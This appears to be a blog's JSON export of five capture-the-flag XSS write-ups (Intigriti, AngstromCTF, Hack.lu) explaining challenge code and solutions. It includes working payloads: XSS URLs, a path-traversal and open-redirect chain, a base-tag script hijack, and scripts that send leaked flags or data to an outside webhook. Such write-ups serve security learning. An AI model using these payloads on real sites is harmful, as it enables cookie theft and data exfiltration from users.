{
  "posts": [
    {
      "slug": "intigriti-0125",
      "title": "Intigriti 0125 XSS Challenge",
      "excerpt": "tl;dr * Abusing URL parsing implemented using Regex . * Bypassing filters to using Path Normalization . * Finally XSS !!. <!--more--> Intigriti...",
      "content": "\n\n\n\n\n**tl;dr**\n\n* Abusing URL parsing implemented using Regex .\n* Bypassing filters to using Path Normalization .\n* Finally XSS !!.\n\n\n\n<!--more-->\nIntigriti dropped another Interesting XSS challenge,This time created by [0xGodson_](https://x.com/0xGodson_) .\n## ðŸ”Ž Challenge Overview\n\nThe challenge is straightforward: it provides an input text box where we can enter our input, and it displays the output accordingly.\n\nThere is no server-side component to this challenge, all functionality is handled entirely on the client-side JavaScript my favorite kind of challenge!\n\n```js \nfunction XSS() {\n            return decodeURIComponent(window.location.search).includes('<') || decodeURIComponent(window.location.search).includes('>') || decodeURIComponent(window.location.hash).includes('<') || decodeURIComponent(window.location.hash).includes('>')\n        }\n        function getParameterByName(name) {\n            var url = window.location.href;\n            name = name.replace(/[\\[\\]]/g, \"\\\\$&\");\n            var regex = new RegExp(\"[?&]\" + name + \"(=([^&#]*)|&|#|$)\");\n            results = regex.exec(url);\n            if (!results) return null;\n            if (!results[2]) return '';\n            return decodeURIComponent(results[2].replace(/\\+/g, \" \"));\n        }\n\n        // Function to redirect on form submit\n        function redirectToText(event) {\n            event.preventDefault();\n            const inputBox = document.getElementById('inputBox');\n            const text = encodeURIComponent(inputBox.value);\n            window.location.href = `/challenge?text=${text}`;\n        }\n\n        // Function to display modal if 'text' query param exists\n        function checkQueryParam() {\n            const text = getParameterByName('text');\n            if (text && XSS() === false) {\n                const modal = document.getElementById('modal');\n                const modalText = document.getElementById('modalText');\n                modalText.innerHTML = `Welcome, ${text}!`;\n                textForm.remove()\n                modal.style.display = 'flex';\n            }\n        }\n\n     window.onload = function () {\n                generateFallingParticles();\n                checkQueryParam();\n            };\n\n```\n\nExamining the code, we can see that our input is stored in the **text** variable and eventually ends up in the **innerHTML** sink, suggesting an easy XSS. However, we need to make the **XSS()** function return **true**.  \n\nThe **XSS()** function checks for **<** and **>** characters in the **window.location.search** and **window.location.hash** parts of the URL. This means that if we input **?text=\\<img src=x onerror=alert()>**, it will be blocked because **window.location.search** contains **<** and **>**.\n\n\n![image](https://hackmd.io/_uploads/B1kLj9qwkx.png)\n\n## ðŸ¥· Attack plan\n\nLooking at how the **text** parameter is being parsed in the **getParameterByName()** function, we can see that it is being parsed using a Regex that checks for a match in the entire URL.\n\nAs you can see, the **XSS()** check for starting **<** and closing **>** occurs on **window.location.search** and **window.location.hash**, but the URL parameter **text** is being parsed using Regex from **window.location.href**, which contains the entire URL.\n\nSo if we manage to sneak in our payload somewhere other than the search part or the hash part of the URL, it will be parsed by the Regex and will end up in the innerHTML sink.\n\nWhat if we give it in the path part of the URL?!  \n\nLike this:  ``https://challenge-0125.intigriti.io/&text=<payload>/../challenge``\n\nHere, the Regex will parse it, and the search part and hash part of the URL are empty and don't contain starting **<** and closing **>**, so the payload will reach the innerHTML sink and pop `alert()`.\n\n\nMake sure to URL encode the **/** !!\n## ðŸš€  Final Payloads\n\n**https://challenge-0125.intigriti.io/&text=%3Cimg%20src=x%20onerror=alert()%3E%2f../challenge**\n\n## ðŸ’€ Exploit !!\n\n![image](https://hackmd.io/_uploads/By0cyicvyl.png)\n\n\n",
      "date": "2025-01-19",
      "author": "Alfin Joseph",
      "category": "General",
      "readTime": "3 min read",
      "tags": []
    },
    {
      "slug": "intigriti-0824",
      "title": "Intigriti 0824 XSS Challenge",
      "excerpt": "tl;dr * Bypassing CSPT filters and UUID validations implemented using Regex . * Chaining CSPT and Open-Redirect to achieve XSS . * Finally XSS and...",
      "content": "\n**tl;dr**\n\n* Bypassing CSPT filters and UUID validations implemented using Regex .\n* Chaining CSPT and Open-Redirect to achieve XSS .\n* Finally XSS and retrive the admin cookie .\n\n\n\n<!--more-->\nIntigriti dropped another awesome XSS challenge,This time created by [@_CryptoCat](https://x.com/_CryptoCat). The challenge felt fairly straightforward,  definitely less headbanging than usual, I managed to solve it in around 20 minutes after diving in.\n## ðŸ”Ž Challenge Overview\n\n\nThe challenge revolved around a classic note-taking application, featuring standard functionalities like creating , viewing notes and also it included an option to report the note, which would trigger an admin bot to visit and review it.\n\n![image](https://hackmd.io/_uploads/HyPmr2DqA.png)\n\n\nAs is typical with XSS challenges, the goal was to obtain the admin bot's cookie, which was the flag. For that we needed XSS.\n\nFirstly taking a closer look at the 2 features, which are \n- Create Note \n- View Note\n\n\n## 1) Create Note \n\nThe Create Note feature is straightforward. It sends a request to ``/api/notes/fetch``, creating a note with a unique UUID. The note can then be viewed by navigating to ``/view?note-uuid`` .\n```python=\n@main.route('/api/notes/store', methods=['POST'])\n@login_required\ndef store():\n    data = request.get_json()\n    content = data.get('content')\n    # Server-side XSS protection\n    sanitized_content = bleach.clean(content)\n    note = Note.query.filter_by(user_id=current_user.id).first()\n    if note:\n        note.content = sanitized_content\n    else:\n        note = Note(user_id=current_user.id, content=sanitized_content)\n        db.session.add(note)\n\n    db.session.commit()\n    return jsonify({'success': 'Note stored', 'note_id': note.id})\n```\n\nThe note content is sanitized server-side using the Bleach library, so this eliminates any possibility of any quick XSS.But still we had a harmless **Html injection**.\n\n \n## 2) View Note \n\nThis appeared to be the real challenge. Upon checkin ``view.html``, it becomes clear that the note-uuid is used to fetch the note contents via the fetch() method. \n\n```js \n window.addEventListener(\"load\", function () {\n        const urlParams = new URLSearchParams(window.location.search);\n        const noteId = urlParams.get(\"note\");\n        if (noteId) {\n            document.getElementById(\"note-id-input\").value = noteId;\n            validateAndFetchNote(noteId);\n        }\n    });\n```\n\nImmediately, my mind turned to **CSPT (Client-Side Path Traversal)**, given that we had control over the fetch request.\n\n> Client Side Path Traversal attacks arises when a web application loads some content using XHR(XmlHTTPRequests) or fetch() and the user have control over some section of the path where to load the resource.\n\n\nTaking a look at the ``validateAndFetchNote()`` function\n\n```js \n\n    function validateAndFetchNote(noteId) {\n        if (noteId && isValidUUID(noteId.trim())) {\n            history.pushState(null, \"\", \"?note=\" + noteId);\n            fetchNoteById(noteId);\n        } else {\n            showFlashMessage(\n                \"Please enter a valid note ID,\",\n                \"danger\"\n            );\n        }\n    }\n```\n\nLooks like there are some checks after all .\n\nIt only fetched notes with valid UUIDs using the ``isValidUUID()`` function. Additionally, the fetchNoteByID() function had a CSPT check before making the actual fetch by using ``noteId.includes(\"../\")`` .\n\n\n```js \nfunction fetchNoteById(noteId) {\n        if (noteId.includes(\"../\")) {\n            showFlashMessage(\"Input not allowed!\", \"danger\");\n            return;\n        }\n        fetch(\"/api/notes/fetch/\" + decodeURIComponent(noteId), {\n            method: \"GET\",\n            headers: {\n                \"X-CSRFToken\": csrf_token,\n            },\n        })\n            .then((response) => response.json())\n            .then((data) => {\n                if (data.content) {\n                    document.getElementById(\"note-content\").innerHTML =\n                        DOMPurify.sanitize(data.content);\n                    document.getElementById(\n                        \"note-content-section\"\n                    ).style.display = \"block\";\n                    showFlashMessage(\"Note loaded successfully!\", \"success\");\n                } else if (data.error) {\n                    showFlashMessage(\"Error: \" + data.error, \"danger\");\n                } else {\n                    showFlashMessage(\"Note doesn't exist.\", \"info\");\n                }\n                if (data.debug) {\n                    document.getElementById(\"debug-content\").outerHTML =\n                        data.debug;\n                    document.getElementById(\n                        \"debug-content-section\"\n                    ).style.display = \"block\";\n                }\n            });\n    }\n    \n```\n\nWhen our note is fetched, the server returns a JSON object containing the note's content. This content is then rendered using innerHTML, with DOMPurify applied to sanitize it, effectively preventing XSS. \n\nHowever, if the JSON response includes a debug key, its value is rendered using **outerHTML** without any sanitization, which can be used to get XSS .\n\n```js \n if (data.debug) {\n        document.getElementById(\"debug-content\").outerHTML = data.debug;\n        document.getElementById(\n            \"debug-content-section\"\n        ).style.display = \"block\";\n}\n\n```\n## ðŸ¥· Attack plan\n\nThe plan is to manipulate the fetch request so that it returns a JSON object containing a **debug** key. However, the server only responds with a JSON object that includes a **content key** and the noteâ€™s content, with no way to modify this server response directly. The only method to achieve this would be to return the **modified JSON from our own server**.\n\nHowever, we only have CSPT (Client-Side Path Traversal) at our disposal, which allows us to control the path of the fetch() request. This means we can only direct the fetch to different endpoints .\n\n```js \nfetch(\"/api/notes/fetch/\" + decodeURIComponent(noteId))\n```\n\nUnless there is an **Open-Redirect** in any of the endpoints !!\n\nIf we have an **Open-redirect**, we can use the CSPT to redirect the fetch() request to the endpoint having open-redirect, and then use the open redirect to send the request to our attacker's server. From there, we can respond with a JSON object that includes the debug key, containing our XSS payload.\n\n![finalXSS](https://hackmd.io/_uploads/Sy56QfKcR.png)\n\n\n## Open Redirect\nThere is an endpoint named ``/contact`` that accepts a query parameter called **return**. This endpoint will redirect the user to the URL specified by the value of the return parameter.\n\n```py\n@main.route('/contact', methods=['GET', 'POST'])\ndef contact():\n    form = ContactForm()\n    return_url = request.args.get('return')\n    if request.method == 'POST':\n        if form.validate_on_submit():\n            flash('Thank you for your message!', 'success')\n            if return_url and is_safe_url(return_url):\n                return redirect(return_url)\n            return redirect(url_for('main.home'))\n    if return_url and is_safe_url(return_url):\n        return redirect(return_url)\n    return render_template('contact.html', form=form, return_url=return_url)\n```\nSo now we can redirect to the attackers site by just giving the attacker site as the return query parameter.\n\n```py\n                  /contact?return=https://attacker-site.com\n```\n\n## Bypassing the CSPT Filters \n\nNow that we have Open-Redirect in the /contact endpoint all we have to do is path traverse to that endpoint using CSPT.However we have to bypass a few checks for that.\n\n- The note uuid check -> **isValidUUID()** function\n- Path traversal check ->  **noteId.includes(\"../\")**\n\n\n### Bypassing isValidUUID\nLooking a bit closer at the **isValidUUID()** function, we can see that it validates UUIDs using a regular expression.\n\n```js \nfunction isValidUUID(noteId) {\n        const uuidRegex =\n            /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;\n        return uuidRegex.test(noteId);\n    }\n```\nHere the Regex ``[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`` only ensures that the UUID pattern appears at the end of the string. **So there can be any prefix to this uuid , that means we can give ../../ before the uuid .**\n\n```\n../82652102-973d-429d-82e0-245a4fbfd6cb \n```\nTo ensure that it was a proper UUID the regex should have included a ``^``\nin the beginnning like this.\n\n```\n/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i\n```\n\nSo we can do CSPT to the /contact endpoint like this.\n\n```\n/view?note=../../../contact?return=http://attack&82652102-973d-429d-82e0-245a4fbfd6cb\n```\n\nHowever ../ was still **blocked !!!**\n### Bypassing the Path traversal check\n\nUpon looking closer, you can see that after the noteId is being checked, it is URL-decoded within the fetch function.\n\n```js \nif (noteId.includes(\"../\")) {\n            showFlashMessage(\"Input not allowed!\", \"danger\");\n            return;\n        }\n        fetch(\"/api/notes/fetch/\" + decodeURIComponent(noteId), {\n            method: \"GET\",\n            headers: {\n                \"X-CSRFToken\": csrf_token,\n            },\n        })\n```\nSo we can easily bypass this check by just double urlencoding the noteId.\n```\nview=..%252F..%252F..%252Fcontact?return=http://attacker&UUID\n```\nSo during the **noteId.includes(\"../\")** check, the noteId will be **..%2F..%2Fcontact**, so the check will return **false**. However, when fetch() is called, noteId gets URL-decoded with decodeURIComponent(noteId), turning it into **../../../contact**.\n\n## ðŸš€  Final Payloads\n\nNow that we've bypassed both security checks, let's combine everything together.\n\n* **Regex Bypass**: By using ../../../ as a prefix to the UUID, we can bypass the regex validation.\n* **Path Traversal Check Bypass**: Double URL encoding the payload allows us to bypass the path traversal check.\n\nWith these steps, we can direct the fetch request to /contacts, which will **trigger an Open Redirect to our attacker's server**. The server responds with JSON containing a debug key with the XSS payload. This payload is then inserted into the outerHTML, leading to XSS.\n\n\n```\n..%252F..%252F..%252Fcontact?return=https://attacker/exp.json%26e447f4e1-f7c9-439c-8378-b65b83189b60\n```\n\nOn the attackerâ€™s server, we need to return a JSON object with the key debug and our XSS payload as the value.\n\n```json \n{ \"debug\": \"<img src=x onerror=alert()>\"} // for simple alert\n```\n\n## ðŸ’€ Exploit !!\n\n**Finally It works!!**\n\n![image](https://hackmd.io/_uploads/BkxpOBjqR.png)\n\nTo obtain the flag stored in the admin's cookie, we can simply access **document.cookie** within the XSS payload. Once we have the cookie, we can send it to our server and solve the challenge.\n",
      "date": "2025-01-05",
      "author": "Alfin Joseph",
      "category": "General",
      "readTime": "7 min read",
      "tags": []
    },
    {
      "slug": "intigriti-0724",
      "title": "Intigriti 0724 XSS Challenge",
      "excerpt": "tl;dr + Dom clobbering to clobber isDevelopmet + Throwing an error using RPO to prevent Dompurify from loading + Using base tag's to import our...",
      "content": "\n**tl;dr**\n\n+ Dom clobbering to clobber isDevelopmet\n+ Throwing an error using RPO to prevent Dompurify from loading\n+ Using base tag's to import our evil.js\n<!--more-->\n\n\n## ðŸ”Ž Initial analysis\n\nWe are given a memo sharing application , and its seems like we html injection using the memo parameter. Looking at the client-side code for the application.\n```html\n<script integrity=\"sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=\">\n      document.getElementById(\"memoForm\").addEventListener(\"submit\", (event) => {\n        event.preventDefault();\n        const memoContent = document.getElementById(\"memoContentInput\").value;\n        window.location.href = `${window.location.href.split(\"?\")[0]}?memo=${encodeURIComponent(\n          memoContent\n        )}`;\n      });\n\n      const urlParams = new URLSearchParams(window.location.search);\n      const sharedMemo = urlParams.get(\"memo\");\n\n      if (sharedMemo) {\n        const displayElement = document.getElementById(\"displayMemo\");\n        //Don't worry about XSS, the CSP will protect us for now\n        displayElement.innerHTML = sharedMemo;\n\n        if (origin === \"http://localhost\") isDevelopment = true;\n        if (isDevelopment) {\n          //Testing XSS sanitization for next release\n          try {\n            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);\n            displayElement.innerHTML = sanitizedMemo;\n          } catch (error) {\n            const loggerScript = document.createElement(\"script\");\n            loggerScript.src = \"./logger.js\";\n            loggerScript.onload = () => logError(error);\n            document.head.appendChild(loggerScript);\n          }\n        }\n      }\n    </script>\n```\nas you can see our input HTML goes into an innerHTML sink in the beginning itself, however there is no easy XSS as there is a CSP. \n\n```js\n\ndefault-src *; script-src 'strict-dynamic' 'sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw=' 'sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=';\n```\n\nThe csp doesnt seem too strict , the first thing that i thought of was that default src is * and there is no base uri directive in the csp .\n\nSo we can inject a base tag with our server as the href value which will make all the scripts with relative paths in the page load resources from our server.\n\nHowever there is only one script being used in the page which is  dompurify.js and it is being loaded way before our injection happens so we cant make it load from our server using base tags.\n\nHowever there is another script (logger.js) that is being loaded dynamically if certain conditions are satisfied. We can control the location from where logger.js is loaded using base tags as it is being loaded after our injection happens .\n```js\nif (origin === \"http://localhost\") isDevelopment = true;\n        if (isDevelopment) {\n          //Testing XSS sanitization for next release\n          try {\n            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);\n            displayElement.innerHTML = sanitizedMemo;\n          } catch (error) {\n            const loggerScript = document.createElement(\"script\");\n            loggerScript.src = \"./logger.js\";\n            loggerScript.onload = () => logError(error);\n            document.head.appendChild(loggerScript);\n          }\n        }\n```\nSo to make logger.js load from our external server we have somehow reach the catch block. So for that to happen we need isDevelopment to be true, so that we can get inside the if block.\n\nisDeveloment is only set to true if the origin is localhost.At the first glance it seems impossible to set isDevelopment as true.\n\nHowever there are certain stuff you could to with just HTML injection!!\n\n## ðŸ¥· Attack plan\n\nSo the attack plan is to use DOM clobbering here as we have HTML injection to define the isDevelopment variable. As isDevelopment is a global variable a simple tag with id attribute as isDevelopment will define that variable. Eg\n\n```js\n<a id=\"isDevelopment\">,<div id=\"isdevelopment\"> etc \n```\n\n## Causing an Error to reach the catch block ðŸŒŸ\n\nSo now we are inside the if block , and to get to our logger.js script to load we have to get to the catch block . For that we have to cause an error somehow in these lines of code\n\n```js\ntry {\n    const sanitizedMemo = DOMPurify.sanitize(sharedMemo);\n    displayElement.innerHTML = sanitizedMemo;\n}\n```\n\nIf you look at the source code closely you can see that Dompurify is being loaded as a relative path. so if we access the page like /index.html/blah dompurify will try to get loaded from /blah .\n\nSo now that we are in the catch block we can use a base tag to load logger.js from our server.\n\n## ðŸš€  Final Payloads\n```html\n<a id=\"isDevelopment\">asdf</a><base href=\"https://alfino.free.beeceptor.com/\">\n```\nwhere we host logger.js at https://alfino.free.beeceptor.com/logger.js\n\n",
      "date": "2024-06-06",
      "author": "Alfin Joseph",
      "category": "writeups",
      "readTime": "4 min read",
      "tags": [
        "writeups"
      ]
    },
    {
      "slug": "angstrom",
      "title": "WaterMark as a Service AngstromCTF",
      "excerpt": "tl;dr + XS-search 200 / 404 . + Leaking using HTML injection in a same-site challenge. + Link tags and Error events . <!--more--> ðŸ”Ž Initial analysis...",
      "content": "\n**tl;dr**\n\n+ XS-search 200 / 404 .\n+ Leaking using HTML injection in a same-site challenge.\n+ Link tags and Error events .\n\n<!--more-->\n## ðŸ”Ž Initial analysis \n\nWe are given the application source code and a challenge link. Also, there is a ``waaas.js`` for the admin bot. Looking at the application, the main functionality was the search endpoint.\n\nTaking a look at the code for /search endpoint in the ``index.js`` file.\n\n```js \napp.get('/search', (req, res) => {\n\tif (req.cookies['admin_cookie'] !== secretvalue) {\n\t\tres.status(403).send(\"Unauthorized\");\n\t\treturn;\n\t}\n\ttry {\n\t\tlet query = req.query.q;\n\t\tfor (let flag of flags) {\n\t\t\tif (flag.indexOf(query) !== -1) {\n\t\t\t\tres.status(200).send(\"Found\");\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\tres.status(404).send(\"Not Found\");\n\t} catch (e) {\n\t\tconsole.log(e);\n\t\tres.sendStatus(500);\n\t}\n})\n```\nIt was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.\n## ðŸ¥· Attack plan\n\nSince we cant directly access the /search enpoint we have to somehow make the admin send those requests. One approach is to get XSS anywhere in the site so we can send fetch requests bruteforce the flag. But unfortunately there is no XSS in this site.\n\nThe Next approach would be an **XS-Search** attack to leak the flag . As the bot is visiting any url we give it. In the /search enpoint if the query is a valid substring of the flag it was returning **200 Found** and if its not a valid substring it was returning **404 Not Found**.\n\nWe can use [Error Events](https://https://xsleaks.dev/docs/attacks/error-events/) to differntiate between these 2 status codes cross site .\n\nBut there is another issue . . . . . **Same Site Cookies!!** . Looking the admin bots source code we can see that the admin cookie is **same-site Lax** . \n\n```js \nconst cookie = {\n                domain: domain,\n                name: \"admin_cookie\",\n                value: key,\n                httpOnly: true,\n                secure: true,\n                sameSite: 'Lax'\n    };\n```\nSo the cookies won't be sent on the  requests which are sent from our hosted exploit as it wont be same-site ðŸ˜“.\n\n## SameSite Leaks ftw  ðŸŒŸ\n\nIf we have XSS or HTML injection in any domain which is same-site to the challenge domain we can use that in our favour for [Same Site Leaks](https://https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks).\n\nThe challenge was hosted on ``https://wwwwwwwwaas.web.actf.co/`` and all other challenges was were subdomains of ``web.actf.co`` and fortunately we had XSS on ``markdown.web.actf.co`` which is **same-site**.\n\nSo now we can host our exploit to leak the flag on ``markdown.web.actf.co`` .\n\n## ðŸš€ Final Payloads\n\n```js\nconst charset = \"abcdef1234567890{}ghijklmnopqrstuvwxyz_\"\nlet found = \"actf\"\nconst leak_url = \"https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5\"   \n\nconst next = (i) => {\n      char = charset[i]\n      link = document.createElement(\"link\")\n      link.rel = \"stylesheet\"\n      document.head.appendChild(link)            \n      link.onload = () => {\n           found += charset[i]\n           navigator.sendBeacon(leak_url,JSON.stringify({type: \"success\", found:found,char:charset[i] }))\n           next(0)\n       }\n\n       link.onerror = () => {\n           next(i+1)\n       }\n       link.href = \"https://wwwwwwwwaas.web.actf.co/search?q=\"+found+charset[i]\n}\nnext(0)\n```\n## ðŸš© Flag \n\n``actf{the_w_watermarks_the_whereabouts}``\n",
      "date": "2024-05-26",
      "author": "Alfin Joseph",
      "category": "writeups",
      "readTime": "3 min read",
      "tags": [
        "writeups"
      ]
    },
    {
      "slug": "hacklu",
      "title": "pÃ¤Ã¤Ã¤d - Hack.lu CTF 2023 ",
      "excerpt": "tl;dr + meta redirect to attacker website, using the html injection in the paaad. + leak the unique subdomain with csp violation. + Another meta...",
      "content": "\n**tl;dr**\n\n+ meta redirect to attacker website, using the html injection in the paaad.\n+ leak the unique subdomain with csp violation.\n+ Another meta redirect csrf with the leaked subdomain to make the note public.\n\n<!--more-->\n\n**No. of solves**: 5\n\n## ðŸ”Ž Initial analysis\n\nWe are given the application source code and a challenge link. Also there is a ``bot.js`` for the admin bot. So it was some client side challenge. Looking at the application,  its main functionality was to create pads (basically notes ) and view them. There was html and markdown allowed in the contents of the pad.\n\nLooking at the ``bot.js`` file .\n\n```js \n\n    let page = await browser.newPage();\n\n    // login \n    await page.goto(`https://${DOMAIN}/user/login`, { waitUntil: 'networkidle0' }); // wait until page load\n    // generate admin creds\n    await page.type('#username', ADMIN_USERNAME);\n    await page.type('#password', ADMIN_PASSWORD);\n    // click and wait for navigation\n    await Promise.all([\n        page.click('#submit'),\n        page.waitForNavigation({ waitUntil: 'networkidle0' }),\n    ]);\n\n    // create flag pad\n    await page.goto(`https://${DOMAIN}/p/new`, { waitUntil: 'networkidle0' }); // wait until page load\n    await page.type('#title', 'flag');\n    await page.type('#content', FLAG);\n    // click and wait for navigation\n    await Promise.all([\n        page.click('#submit'),\n        page.waitForNavigation({ waitUntil: 'networkidle0' }),\n    ])\n\n\n    // avoid leaking anything\n    await page.close();\n    page = await browser.newPage();\n\n    page.on('console', (msg) => {\n        console.log('[Console]', msg);\n    });\n\n    // open the link\n    console.log(`Visiting URL: https://${padid}.${DOMAIN} `);\n    await page.goto(`https://${padid}.${DOMAIN}`);\n\n```\nAfter looking at ``bot.js`` it's clear that the flag is in the admins pad. So we have to somehow steal the contents of the admins pad using XSS or using some other client side attack. But unfortunately, the content inside the pad is sanitized using the HTML Sanitizer API . So there is no chance for direct XSS to steal the admins pad.\n\n```js \n    const markdown = (md) => {\n        return md.replace(/__(.*?)__/gs, '<strong>$1</strong>')\n            .replace(/_(.*?)_/gs, '<em>$1</em>')\n            .replace(/## (.*?)\\n/gs, '<h2>$1</h2>')\n            .replace(/# (.*?)\\n/gs, '<h1>$1</h1>')\n            .replace(/!\\[(.*?)\\]\\((.*?)\\)/gs, '<img alt=\"$1\" src=\"$2\" />')\n            .replace(/\\[(.*?)\\]\\((.*?)\\)/gs, '<a href=\"$2\">$1</a>')\n            .replace(/`(.*?)`/gs, '<code>$1</code>')\n            .replace(/\\n/gs, '<br>')\n    }\n    let md = markdown(padcontent.dataset.content)\n    const sanitizer = new Sanitizer()\n\n    padcontent.setHTML(md, { sanitizer })\n\n```\n\nLooking at the code to create pads at the ``/p/new`` endpoint. We can see that there is a cookie called latest being set with a unique_id.\n\n```js\n\nrouter.post('/p/new', ensureAuthenticated, async (req, res) => {\n    let {title, content, isPublic, isTemp} = req.body\n\n    let pad = new Pad({\n        username: req.session.username,\n        title,\n        content,\n        isPublic: isPublic ? true : false,\n        createdAt: isTemp ? new Date() : undefined\n    })\n    console.log(pad)\n    await pad.save()\n\n    res.cookie('latest', {title, uniqueId: pad.uniqueId}, {\n        secure: true,\n        httpOnly: true,\n        sameSite: 'none',\n    })\n    \n    req.flash('success', 'Pad created.')\n    return res.redirect('/')    \n})\n```\n\nand the pad can be viewed by visiting that unique subdomain ``unique_id.paaad.space`` . Looking at the code for that.\n\n```js \nrouter.get('/', ensureAuthenticated, async (req, res) => {\n     // get id from subdomain\n    let id = req.subdomains[0]\n    // show the index page\n    if(!id){\n        let pads = await Pad.find({username: req.session.username})\n        return res.render('index', {\n            username: req.session.username,\n            latest: req.cookies.latest,\n            pads\n        })\n    }\n    if (!/^[a-f0-9]{48}$/.test(id)){\n        req.flash('danger', 'Invalid pÃ¤Ã¤Ã¤d id.')\n        return res.redirect(`https://${process.env.DOMAIN}`)\n    }\n\n    // find pad with id \n    let pad = await Pad.findOne({uniqueId: id})\n    \n```\n\nhere it is taking the id from `` req.subdomains[0] `` and fetching the pad from the database with that id . so anyone with that unique id can view the contents of the pad, since there are no checks.\n\n## ðŸ¥· Attack plan\n\nSo if we can manage to somehow get the admin pads unique_id , we can access his pad. So the idea is to somehow leak this unique subdomain. There is another feature of this application that I found interesting, that allows you to view the latest note created by a user.\n\nLooking at the code for that functionality.\n\n```js \n\nrouter.get('/p/latest', async (req, res) => {\n    if(!req.cookies.latest){\n        req.flash('danger', 'No latest pÃ¤Ã¤Ã¤d.')\n        return res.redirect('/')\n    }\n    let id = req.cookies.latest.uniqueId\n    if (!/^[a-f0-9]{48}$/.test(id)){\n        req.flash('danger', 'Invalid pÃ¤Ã¤Ã¤d id.')\n        return res.redirect(`https://${process.env.DOMAIN}`)\n    }\n    return res.redirect(`https://${id}.${process.env.DOMAIN}`)\n})\n```\n\nBasically, if we visit the endpoint ``/p/latest`` with the cookie latest, it will redirect to unique_id.paaad.space. So if we manage to somehow leak the subdomain from this redirection we can get the pad. \n\nThe initial plan is to use csp violations to leak the subdomain. So to do that we have to first redirect the bot to our attacker's website. Since ``.setHTML()`` allows meta tags we can use a meta redirect to our attacker controlled website .\n\n## CSP violation leak ðŸŒŸ\n\n\n\nIf we put ``https://xn--pd-viaaa.space/p/latest `` in an iframe and then add a csp with   ``frame-src https://xn--pd-viaaa.space/p/latest `` it will trigger a csp violation , because ``https://xn--pd-viaaa.space/p/latest `` redirects to ``unique_id.xn--pd-viaaa.space`` . \n\nSo using this technique we can leak the unique_id .\n\n\n## CSRF to make the note public ðŸŒŸ \nAfter getting the unique id there is still one more problem to solve. The admins pad is not public, so we can't access it directly due to this check.\n\n```js \nif(!pad.isPublic && req.session.username != pad.username){\n        req.flash('danger', 'Not allowed to access this non-public pÃ¤Ã¤Ã¤d.')\n        return res.redirect(`https://${process.env.DOMAIN}`)\n    }\n```\n\nThe code to make the note public is as follows.\n\n```js \nif(req.session.username == pad.username){\n        if(req.query.edit=='isPublic'){\n            pad.isPublic = !pad.isPublic\n            await pad.save()\n            return res.redirect(`https://${id}.${process.env.DOMAIN}`)\n        }\n        if(req.query.edit=='isTemp'){\n            pad.createdAt = pad.createdAt ? undefined : new Date()\n            await pad.save()\n            return res.redirect(`https://${id}.${process.env.DOMAIN}`)\n        }\n    }\n```\n\nSo we just have to make the admin send a get request using ?edit=isPublic to make the note public. But unfortunately, the session cookie is having ``sameSite: 'strict'`` . So doing a csrf to make the note public won't work. \n\nTo overcome this we can run the bot twice, the first time to leak the unique_id and the next time with a pad that has a meta redirect to ``unique_id.xn--pd-viaaa.space?edit=isPublic`` to make the note public.\n\n## ðŸš€  Final Payloads\n\n``First pad``\n```html\n<!-- redirect to attacker site -->\n<meta http-equiv=\"refresh\" content=\"1; url=https://attacker.com/attacker.html\">\n```\n\n``https://attacker.com/attacker.html``\n```html \n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"Content-Security-Policy\" content=\"frame-src 'self' xn--pd-viaaa.space;\">\n    <title>TEST</title>\n</head>\n\n<body>\n    <script>\n        document.addEventListener('securitypolicyviolation', async function (event) {\n            console.log(event)\n            navigator.sendBeacon(location.href,event.blockedURI)\n\n        });      \n    </script>\n    <iframe src=\"https://pÃ¤Ã¤Ã¤d.space/p/latest\"></iframe>\n</body>\n\n</html>\n```\n``Second pad``\n```html\n<!-- to make pad public-->\n<meta http-equiv=\"refresh\" content=\"1; url=unique_id.xn--pd-viaaa.space?edit=isPublic\">\n```\n## ðŸš© Flag\n\n``flag{hmmmmmmmmmXDD} ``\n",
      "date": "2024-05-26",
      "author": "Alfin Joseph",
      "category": "writeups",
      "readTime": "5 min read",
      "tags": [
        "writeups"
      ]
    }
  ],
  "categories": [
    "General",
    "writeups"
  ],
  "generatedAt": "2025-06-08T13:33:28.248Z"
}